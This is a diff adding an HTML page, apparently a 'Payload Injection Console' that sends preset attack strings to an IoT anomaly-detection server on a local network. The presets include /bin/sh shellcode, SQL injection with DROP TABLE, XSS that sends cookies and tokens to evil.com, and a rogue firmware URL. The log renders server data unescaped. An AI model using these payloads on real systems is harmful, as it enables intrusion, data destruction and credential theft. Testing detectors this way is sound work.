@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>FALCRON - Payload Injection Console</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: #0a0a0f;
+      color: #e0e0e0;
+      font-family: 'Segoe UI', 'Consolas', monospace;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 30px 20px;
+    }
+    h1 {
+      font-size: 28px;
+      color: #ff3333;
+      text-shadow: 0 0 20px rgba(255, 50, 50, 0.5);
+      margin-bottom: 6px;
+      letter-spacing: 2px;
+    }
+    .subtitle {
+      color: #888;
+      font-size: 13px;
+      margin-bottom: 30px;
+    }
+    .container {
+      width: 100%;
+      max-width: 620px;
+    }
+    .section-title {
+      font-size: 14px;
+      color: #ff6b6b;
+      text-transform: uppercase;
+      letter-spacing: 1.5px;
+      margin-bottom: 12px;
+      border-bottom: 1px solid #222;
+      padding-bottom: 6px;
+    }
+
+    /* Target selector */
+    .target-box {
+      background: #101020;
+      border: 1px solid #2a2a4a;
+      border-radius: 10px;
+      padding: 18px;
+      margin-bottom: 24px;
+    }
+    .target-buttons {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 14px;
+    }
+    .target-btn {
+      flex: 1;
+      padding: 14px 10px;
+      border-radius: 8px;
+      border: 2px solid #2a2a3a;
+      background: #141420;
+      color: #aaa;
+      cursor: pointer;
+      text-align: center;
+      transition: all 0.25s;
+      font-size: 13px;
+    }
+    .target-btn:hover {
+      border-color: #555;
+    }
+    .target-btn.active {
+      border-color: #ff4444;
+      background: #1a1020;
+      color: #fff;
+      box-shadow: 0 0 20px rgba(255, 50, 50, 0.2);
+    }
+    .target-btn .t-name {
+      font-weight: bold;
+      font-size: 14px;
+      margin-bottom: 3px;
+    }
+    .target-btn .t-ip {
+      font-size: 11px;
+      color: #666;
+      font-family: 'Consolas', monospace;
+    }
+    .target-btn.active .t-ip {
+      color: #ff8888;
+    }
+    .custom-ip-row {
+      display: flex;
+      gap: 8px;
+      align-items: center;
+    }
+    .custom-ip-row label {
+      color: #888;
+      font-size: 12px;
+      white-space: nowrap;
+    }
+    .custom-ip-row input {
+      flex: 1;
+      background: #0d0d18;
+      border: 1px solid #2a2a3a;
+      color: #ff9999;
+      padding: 9px 12px;
+      border-radius: 6px;
+      font-family: 'Consolas', monospace;
+      font-size: 13px;
+      outline: none;
+    }
+    .custom-ip-row input:focus { border-color: #ff4444; }
+    .target-status {
+      margin-top: 10px;
+      font-size: 12px;
+      padding: 6px 10px;
+      border-radius: 4px;
+      text-align: center;
+    }
+    .target-status.online { background: #0a1a0a; color: #44ff44; border: 1px solid #1a3a1a; }
+    .target-status.offline { background: #1a0a0a; color: #ff4444; border: 1px solid #3a1a1a; }
+    .target-status.checking { background: #1a1a0a; color: #ffaa44; border: 1px solid #3a3a1a; }
+
+    /* Preset attack buttons */
+    .presets {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+      margin-bottom: 28px;
+    }
+    .preset-btn {
+      background: #141420;
+      border: 1px solid #2a2a3a;
+      color: #ddd;
+      padding: 14px 12px;
+      border-radius: 8px;
+      cursor: pointer;
+      text-align: left;
+      transition: all 0.2s;
+    }
+    .preset-btn:hover {
+      border-color: #ff4444;
+      background: #1a1a2a;
+      box-shadow: 0 0 15px rgba(255, 50, 50, 0.15);
+    }
+    .preset-btn .name {
+      font-weight: bold;
+      font-size: 13px;
+      color: #ff6b6b;
+      margin-bottom: 4px;
+    }
+    .preset-btn .desc {
+      font-size: 11px;
+      color: #777;
+    }
+
+    /* Custom payload area */
+    .custom-area { margin-bottom: 24px; }
+    textarea {
+      width: 100%;
+      height: 120px;
+      background: #0d0d18;
+      border: 1px solid #2a2a3a;
+      color: #0f0;
+      font-family: 'Consolas', monospace;
+      font-size: 13px;
+      padding: 14px;
+      border-radius: 8px;
+      resize: vertical;
+      outline: none;
+    }
+    textarea:focus { border-color: #ff4444; }
+    textarea::placeholder { color: #444; }
+
+    /* Target device selector */
+    .device-row {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 16px;
+    }
+    select {
+      flex: 1;
+      background: #141420;
+      border: 1px solid #2a2a3a;
+      color: #ddd;
+      padding: 10px 12px;
+      border-radius: 6px;
+      font-size: 13px;
+      outline: none;
+      cursor: pointer;
+    }
+    select:focus { border-color: #ff4444; }
+
+    /* Fire button */
+    .fire-btn {
+      width: 100%;
+      padding: 16px;
+      background: linear-gradient(135deg, #cc0000, #ff3333);
+      border: none;
+      border-radius: 10px;
+      color: #fff;
+      font-size: 16px;
+      font-weight: bold;
+      letter-spacing: 2px;
+      cursor: pointer;
+      text-transform: uppercase;
+      transition: all 0.3s;
+      margin-bottom: 28px;
+    }
+    .fire-btn:hover {
+      background: linear-gradient(135deg, #ff3333, #ff5555);
+      box-shadow: 0 0 30px rgba(255, 50, 50, 0.4);
+      transform: scale(1.02);
+    }
+    .fire-btn:active { transform: scale(0.98); }
+    .fire-btn:disabled {
+      background: #333;
+      cursor: not-allowed;
+      box-shadow: none;
+      transform: none;
+    }
+
+    /* Response log */
+    .log-area {
+      background: #0d0d15;
+      border: 1px solid #1a1a2a;
+      border-radius: 10px;
+      padding: 16px;
+      max-height: 300px;
+      overflow-y: auto;
+    }
+    .log-entry {
+      padding: 10px 12px;
+      margin-bottom: 8px;
+      border-radius: 6px;
+      font-size: 12px;
+      line-height: 1.5;
+      animation: fadeIn 0.3s;
+    }
+    .log-entry.blocked {
+      background: #1a0000;
+      border-left: 3px solid #ff3333;
+    }
+    .log-entry.passed {
+      background: #001a00;
+      border-left: 3px solid #33ff33;
+    }
+    .log-entry.error {
+      background: #1a1a00;
+      border-left: 3px solid #ffaa00;
+    }
+    .log-entry .time { color: #666; font-size: 11px; }
+    .log-entry .verdict { font-weight: bold; font-size: 13px; }
+    .log-entry .verdict.red { color: #ff4444; }
+    .log-entry .verdict.green { color: #44ff44; }
+    .log-entry .detail { color: #999; margin-top: 3px; }
+    .log-entry .target-tag {
+      display: inline-block;
+      background: #222;
+      color: #ff8888;
+      padding: 2px 8px;
+      border-radius: 4px;
+      font-size: 10px;
+      margin-left: 8px;
+    }
+    .empty-log {
+      color: #444;
+      text-align: center;
+      padding: 30px;
+      font-size: 13px;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-8px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body>
+
+  <h1>PAYLOAD INJECTION CONSOLE</h1>
+  <p class="subtitle">FALCRON Security Test Interface &mdash; by Labeeba</p>
+
+  <div class="container">
+
+    <!-- ========== TARGET SELECTOR ========== -->
+    <div class="section-title">Choose Target Website</div>
+    <div class="target-box">
+      <div class="target-buttons">
+        <button class="target-btn active" id="btn-shaha" onclick="selectTarget('shaha')">
+          <div class="t-name">SHAHA</div>
+          <div class="t-ip">192.168.1.139:8000</div>
+        </button>
+        <button class="target-btn" id="btn-rameeza" onclick="selectTarget('rameeza')">
+          <div class="t-name">RAMEEZA</div>
+          <div class="t-ip" id="rameeza-ip-label">Enter IP below</div>
+        </button>
+        <button class="target-btn" id="btn-custom" onclick="selectTarget('custom')">
+          <div class="t-name">OTHER</div>
+          <div class="t-ip">Custom IP</div>
+        </button>
+      </div>
+      <div class="custom-ip-row">
+        <label>Rameeza / Custom IP:</label>
+        <input type="text" id="customIpInput" placeholder="e.g. 192.168.1.150" oninput="onIpInput()" />
+      </div>
+      <div class="target-status checking" id="targetStatus">Select a target above</div>
+    </div>
+
+    <!-- Preset Attacks -->
+    <div class="section-title">Quick Attack Presets</div>
+    <div class="presets">
+      <button class="preset-btn" onclick="loadPreset('mqtt_overflow')">
+        <div class="name">MQTT Buffer Overflow</div>
+        <div class="desc">Overflow ESP8266 MQTT buffer with shellcode</div>
+      </button>
+      <button class="preset-btn" onclick="loadPreset('sql_injection')">
+        <div class="name">SQL Injection</div>
+        <div class="desc">Classic SQLi on device database query</div>
+      </button>
+      <button class="preset-btn" onclick="loadPreset('xss_attack')">
+        <div class="name">XSS Script Inject</div>
+        <div class="desc">Cross-site scripting via device name field</div>
+      </button>
+      <button class="preset-btn" onclick="loadPreset('thermal_spike')">
+        <div class="name">Thermal Spike</div>
+        <div class="desc">Fake critical temperature to trigger shutdown</div>
+      </button>
+      <button class="preset-btn" onclick="loadPreset('ir_override')">
+        <div class="name">IR Sensor Override</div>
+        <div class="desc">Force IR sensor into permanent triggered state</div>
+      </button>
+      <button class="preset-btn" onclick="loadPreset('firmware_ota')">
+        <div class="name">Firmware OTA Flash</div>
+        <div class="desc">Rogue firmware update injection via OTA</div>
+      </button>
+    </div>
+
+    <!-- Target Device -->
+    <div class="section-title">Target Device</div>
+    <div class="device-row">
+      <select id="targetDevice">
+        <option value="dht11-01">DHT11 Temp Sensor</option>
+        <option value="esp-node-01">ESP8266 Node</option>
+        <option value="ir-sensor-01">IR Motion Sensor</option>
+        <option value="mqtt-broker">MQTT Broker</option>
+      </select>
+    </div>
+
+    <!-- Custom Payload -->
+    <div class="custom-area">
+      <div class="section-title">Payload</div>
+      <textarea id="payloadInput" placeholder="Type or select a preset attack above..."></textarea>
+    </div>
+
+    <!-- Fire -->
+    <button class="fire-btn" id="fireBtn" onclick="launchAttack()">
+      LAUNCH ATTACK
+    </button>
+
+    <!-- Response Log -->
+    <div class="section-title">Server Response Log</div>
+    <div class="log-area" id="logArea">
+      <div class="empty-log">No attacks launched yet. Select a target, pick a preset, and fire!</div>
+    </div>
+
+  </div>
+
+  <script>
+    // ===== Target Management =====
+    const targets = {
+      shaha:   { ip: '192.168.1.139', port: 8000, name: 'SHAHA' },
+      rameeza: { ip: '',              port: 8000, name: 'RAMEEZA' },
+      custom:  { ip: '',              port: 8000, name: 'OTHER' }
+    };
+
+    let activeTarget = 'shaha';
+
+    function selectTarget(name) {
+      activeTarget = name;
+      // Update button styles
+      document.querySelectorAll('.target-btn').forEach(b => b.classList.remove('active'));
+      document.getElementById('btn-' + name).classList.add('active');
+
+      // If rameeza or custom, focus the IP input
+      if (name === 'rameeza' || name === 'custom') {
+        document.getElementById('customIpInput').focus();
+        const ip = document.getElementById('customIpInput').value.trim();
+        if (ip) {
+          targets[name].ip = ip;
+        }
+      }
+
+      updateStatus();
+    }
+
+    function onIpInput() {
+      const ip = document.getElementById('customIpInput').value.trim();
+      if (activeTarget === 'rameeza') {
+        targets.rameeza.ip = ip;
+        document.getElementById('rameeza-ip-label').textContent = ip ? ip + ':8000' : 'Enter IP below';
+      } else if (activeTarget === 'custom') {
+        targets.custom.ip = ip;
+      }
+      // Also handle if user typed ip:port
+      if (ip.includes(':')) {
+        const parts = ip.split(':');
+        targets[activeTarget].ip = parts[0];
+        targets[activeTarget].port = parseInt(parts[1]) || 8000;
+      }
+      updateStatus();
+    }
+
+    function getServerUrl() {
+      const t = targets[activeTarget];
+      if (!t.ip) return null;
+      return `http://${t.ip}:${t.port}`;
+    }
+
+    function updateStatus() {
+      const statusEl = document.getElementById('targetStatus');
+      const url = getServerUrl();
+
+      if (!url) {
+        statusEl.className = 'target-status checking';
+        statusEl.textContent = 'Enter an IP address to target';
+        return;
+      }
+
+      statusEl.className = 'target-status checking';
+      statusEl.textContent = `Checking ${url} ...`;
+
+      fetch(url + '/', { method: 'GET', signal: AbortSignal.timeout(3000) })
+        .then(res => res.json())
+        .then(data => {
+          if (data.status === 'online') {
+            statusEl.className = 'target-status online';
+            statusEl.textContent = `ONLINE - ${targets[activeTarget].name}'s server is reachable at ${url}`;
+          } else {
+            statusEl.className = 'target-status online';
+            statusEl.textContent = `CONNECTED to ${url}`;
+          }
+        })
+        .catch(() => {
+          statusEl.className = 'target-status offline';
+          statusEl.textContent = `OFFLINE - Cannot reach ${url}. Is the server running?`;
+        });
+    }
+
+    // Check Shaha's server on load
+    updateStatus();
+
+    // ===== Preset Payloads =====
+    const presets = {
+      mqtt_overflow: {
+        payload: '\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x90\\x90\\x90\\x90\\xeb\\x1a\\x5e\\x31\\xc0\\x88\\x46\\x07\\x8d\\x1e\\x89\\x5e\\x08\\x89\\x46\\x0c\\xb0\\x0b\\xcd\\x80\\xe8\\xe1\\xff\\xff\\xff/bin/sh OVERFLOW_MQTT_BUFFER device=esp-node-01 len=4096',
+        device: 'esp-node-01'
+      },
+      sql_injection: {
+        payload: "device_id=dht11-01'; DROP TABLE sensor_readings;-- UPDATE firmware SET url='http://evil.com/backdoor.bin' WHERE 1=1;--",
+        device: 'dht11-01'
+      },
+      xss_attack: {
+        payload: '<script>document.location="http://evil.com/steal?cookie="+document.cookie<\/script><img src=x onerror="fetch(\'http://evil.com/exfil?data=\'+localStorage.getItem(\'token\'))">',
+        device: 'esp-node-01'
+      },
+      thermal_spike: {
+        payload: '{"device":"dht11-01","temperature":9999.99,"unit":"C","override":true,"bypass_threshold":true,"cmd":"FORCE_SHUTDOWN","auth":"\\x00\\x00\\x00\\x00"}',
+        device: 'dht11-01'
+      },
+      ir_override: {
+        payload: '{"device":"ir-sensor-01","force_state":"TRIGGERED","loop":true,"interval_ms":0,"flood_count":999999,"disable_cooldown":true,"raw_cmd":"\\xDE\\xAD\\xBE\\xEF"}',
+        device: 'ir-sensor-01'
+      },
+      firmware_ota: {
+        payload: 'OTA_FLASH target=esp-node-01 firmware_url=http://evil.com/rootkit.bin verify=false force=true bypass_signature=true inject_bootloader=\\x7fELF\\x01\\x01\\x01',
+        device: 'esp-node-01'
+      }
+    };
+
+    function loadPreset(name) {
+      const p = presets[name];
+      document.getElementById('payloadInput').value = p.payload;
+      document.getElementById('targetDevice').value = p.device;
+      const ta = document.getElementById('payloadInput');
+      ta.style.borderColor = '#ff4444';
+      setTimeout(() => { ta.style.borderColor = '#2a2a3a'; }, 600);
+    }
+
+    // ===== Launch Attack =====
+    async function launchAttack() {
+      const payload = document.getElementById('payloadInput').value.trim();
+      const device = document.getElementById('targetDevice').value;
+      const btn = document.getElementById('fireBtn');
+      const serverUrl = getServerUrl();
+
+      if (!serverUrl) {
+        alert('Select a target and enter the IP address first!');
+        return;
+      }
+      if (!payload) {
+        alert('Enter a payload first!');
+        return;
+      }
+
+      btn.disabled = true;
+      btn.textContent = 'SENDING TO ' + targets[activeTarget].name + '...';
+
+      try {
+        const res = await fetch(`${serverUrl}/attack`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            payload: payload,
+            target_device: device,
+            attacker: 'Labeeba'
+          })
+        });
+
+        const data = await res.json();
+        addLog(data, res.status, targets[activeTarget].name);
+      } catch (err) {
+        addLog({
+          status: 'error',
+          message: `Connection failed to ${targets[activeTarget].name} (${serverUrl}): ${err.message}`
+        }, 0, targets[activeTarget].name);
+      }
+
+      btn.disabled = false;
+      btn.textContent = 'LAUNCH ATTACK';
+    }
+
+    // ===== Response Log =====
+    function addLog(data, httpStatus, targetName) {
+      const logArea = document.getElementById('logArea');
+      const empty = logArea.querySelector('.empty-log');
+      if (empty) empty.remove();
+
+      const now = new Date();
+      const timeStr = now.toLocaleTimeString();
+      const entry = document.createElement('div');
+
+      const tag = `<span class="target-tag">${targetName}</span>`;
+
+      if (httpStatus === 403) {
+        entry.className = 'log-entry blocked';
+        entry.innerHTML = `
+          <div class="time">${timeStr} ${tag}</div>
+          <div class="verdict red">BLOCKED - Attack Detected!</div>
+          <div class="detail"><b>Reason:</b> ${data.reason || 'N/A'}</div>
+          <div class="detail"><b>Score:</b> ${data.anomalyScore || 'N/A'} | <b>Hash:</b> ${(data.hash || '').substring(0, 20)}...</div>
+          <div class="detail">${data.message || ''}</div>
+        `;
+      } else if (httpStatus === 200) {
+        entry.className = 'log-entry passed';
+        entry.innerHTML = `
+          <div class="time">${timeStr} ${tag}</div>
+          <div class="verdict green">PASSED - No Threat Detected</div>
+          <div class="detail"><b>Reason:</b> ${data.reason || 'N/A'}</div>
+          <div class="detail">${data.message || ''}</div>
+        `;
+      } else {
+        entry.className = 'log-entry error';
+        entry.innerHTML = `
+          <div class="time">${timeStr} ${tag}</div>
+          <div class="verdict" style="color:#ffaa00;">ERROR</div>
+          <div class="detail">${data.message || 'Unknown error'}</div>
+        `;
+      }
+
+      logArea.prepend(entry);
+    }
+  </script>
+</body>
+</html>
